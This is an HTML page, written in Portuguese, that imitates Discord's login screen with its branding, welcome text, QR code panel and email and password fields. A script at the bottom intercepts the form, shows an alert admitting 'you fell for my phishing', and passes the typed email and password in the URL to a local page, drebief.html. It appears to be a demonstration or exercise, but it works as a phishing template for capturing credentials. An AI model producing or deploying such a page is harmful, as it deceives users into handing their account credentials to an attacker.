<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="icon" type="image/png"
        href="https://media.discordapp.net/attachments/1420556949090730094/1420949636885250161/discord-logo-discord-logo-transparent-discord-icon-transparent-free-free-png.png?ex=68d741f9&is=68d5f079&hm=53905482f6343416acaa0545f5269ceddadc84102a56ee086e93e2de0955d568&=&format=webp&quality=lossless&width=777&height=777">
</head>

<body>
    <style>
        body {
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            background-image: url(imagens/backgrounddiscord.png);
            display: flex;
            text-align: center;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-size: cover;
            background-position: center;
        }

        .login {

            background: #393a41;
            width: 700px;
            height: fit-content;
            padding: 20px;
            border-radius: 10px;
            display: flex;
            flex-direction: row;
            gap: 10px;
        }

        .login-field {
            display: flex;
            flex-direction: column;
            margin-bottom: 15px;
            text-align: left;
            color: #c4c5c7;
        }

        a {
            margin-top: 5px;
            text-decoration: none;
            color: rgb(146, 146, 255);
        }

        .login-field input {
            padding-left: 5px;
            color: white;
            background-color: #2e2e34;
            border-radius: 3px;
            border: 50px;
            height: 35px;
        }

        .login-field label {
            color: whitesmoke;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .texto {
            color: #93949a;
            margin-top: 5px;
            text-align: left;
        }

        .login-field input:focus {
            outline: none;
            border: 2px solid rgb(109, 109, 255);
        }

        .login-title {
            color: white;
            text-align: center;
        }

        .login-title * {
            margin-bottom: 0px;
        }

        .login-title h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }

        .login-title p {
            font-size: 14px;
            color: #c4c5c7;
            margin-bottom: 20px;
        }
        .botao {
            background-color: rgb(109, 109, 255);
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px 15px;
            cursor: pointer;
            width: 100%;
            height: 42px
        }
        .texto2 {
            color:white;
        }
        .Top {
            position: absolute;
            top: 26px;
            left: 26px;
            right: 0;
            width: 120px;
            height: auto;
        }
        
    </style>
    <main>
        <div class="login">
            <div style="width: 100%;">
                <div class="login-title">
                    <h1>Boas-vindas de volta!</h1>
                    <p class="titulo">Estamos muito animados em te ver novamente!</p>
                </div>
                <form id="forme">
                    <div class="login-field">
                        <label for="username">Email ou número de telefone: <strong style="color: #e07270;">*</strong></label>
                        <input type="text" id="username" name="username" required>
                    </div>

                    <div class="login-field">
                        <label for="password">Senha: <strong style="color: #e07270;">*</strong></label>
                        <input type="password" id="password" name="password" required>
                        <a id="forgot-pass" class="a" href="#">Esqueceu sua senha?</a>
                    </div>
                    <button class="botao" type="submit">Entrar</button>
                    <p class="texto">Precisando de uma conta?<a id="account" href="#"> Registre-se</a>
                </form>
            </div>
            <div style="padding: 20px;">
                <img src="imagens/discordqr.png">
                    <h2 style="color: white;">Entrar com código QR</h2>
                    <p class="texto2">Escaneie isso com o <strong>app móvel do Discord</strong> para fazer login imediatamente</p>
                    <a href="#">Ou, faça login com uma passkey</a>
                <img class="Top" src="imagens/discordd.png">
            </div>
        </div>
    </main>
    <script>
        document.getElementById('forme').addEventListener('submit', function (event) {
            event.preventDefault(); 
            alert("Você caiu no meu phishing :)");
            let email = document.getElementById('username').value;
            let senha = document.getElementById('password').value;

            window.location = 'drebief.html?email=' + encodeURIComponent(email) + '&senha=' + encodeURIComponent(senha);
        });
    </script>
</body>
</html>
